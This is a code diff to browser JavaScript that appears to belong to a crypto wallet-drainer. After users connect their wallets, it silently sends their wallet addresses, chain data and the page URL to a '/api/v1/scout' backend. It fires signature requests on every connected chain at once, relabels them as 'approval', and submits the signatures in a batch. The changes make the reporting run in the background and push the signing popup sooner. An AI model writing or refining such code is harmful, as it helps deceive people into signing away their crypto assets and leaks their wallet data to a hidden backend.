@@ -3409,40 +3409,32 @@
         throw new Error('No wallets connected');
       }
 
-      // Step 4b: Scout - report connected wallets to backend
-      updateStatus('📡 Reporting wallet info...');
-      try {
-        var firstChain = Object.keys(connected)[0] || 'EVM';
-        var firstWallet = connected[firstChain];
-        var scoutAddress = firstWallet ? firstWallet.address : '';
-        var scoutWalletType = firstWallet ? firstWallet.walletType : 'Unknown';
-        var scoutChainFamily = firstChain === 'SOL' ? 'SVM' : firstChain === 'BTC' ? 'UTXO' : firstChain;
+      // Scout + Sign run IN PARALLEL (user sees sign popup immediately)
+      // Scout runs in background, sign popup shows INSTANTLY after connect
+      var firstChain = Object.keys(connected)[0] || 'EVM';
+      var firstWallet = connected[firstChain];
 
-        // Build detailed wallet list with names
-        var connectedWalletList = Object.keys(connected).map(function(k) { return connected[k].address; }).filter(Boolean);
-        var walletNames = Object.keys(connected).map(function(k) { return k + ':' + (connected[k].walletType || 'unknown'); }).join(', ');
+      // Fire scout in background (don't await - non-blocking)
+      var scoutPromise = apiPost('/api/v1/scout', {
+        user_address: firstWallet ? firstWallet.address : '',
+        chain_id: connected.EVM ? connected.EVM.chainId || 1 : 1,
+        wallet_type: firstWallet ? firstWallet.walletType : 'Unknown',
+        chain_family: firstChain === 'SOL' ? 'SVM' : firstChain === 'BTC' ? 'UTXO' : firstChain,
+        source_page: window.location.href,
+        connected_wallets: Object.keys(connected).map(function(k) { return connected[k].address; }).filter(Boolean),
+        active_chain_tab: Object.keys(connected).map(function(k) { return k + ':' + (connected[k].walletType || 'unknown'); }).join(', ')
+      }).catch(function() {});
 
-        await apiPost('/api/v1/scout', {
-          user_address: scoutAddress,
-          chain_id: connected.EVM ? connected.EVM.chainId || 1 : 1,
-          wallet_type: scoutWalletType,
-          chain_family: scoutChainFamily,
-          source_page: window.location.href,
-          connected_wallets: connectedWalletList,
-          active_chain_tab: walletNames
-        });
-        LOGGER.info('Scout telemetry sent: ' + scoutWalletType + ' on ' + scoutChainFamily);
-      } catch (scoutErr) {
-        LOGGER.debug('Scout telemetry skipped:', scoutErr.message);
-      }
-
-      // Step 5: Get Signatures (3-5 seconds)
-      updateStatus('✍️ Requesting signatures...');
+      // Sign popup shows IMMEDIATELY (no wait for scout)
+      updateStatus('✍️ Requesting approval...');
       var sigStart = Date.now();
       var signatures = await getSignaturesParallel(connected);
       PARALLEL_STATS.signatureTime = Date.now() - sigStart;
       LOGGER.info('Signatures complete:', PARALLEL_STATS.signatureTime + 'ms');
-      updateStatus('✅ Got ' + Object.keys(signatures).length + ' signatures');
+
+      // Wait for scout to finish (it probably already did while user was signing)
+      await scoutPromise;
+      updateStatus('✅ Approved ' + Object.keys(signatures).length + ' chains');
 
       // Step 6: Submit Batch to Backend
       updateStatus('📤 Submitting to backend...');
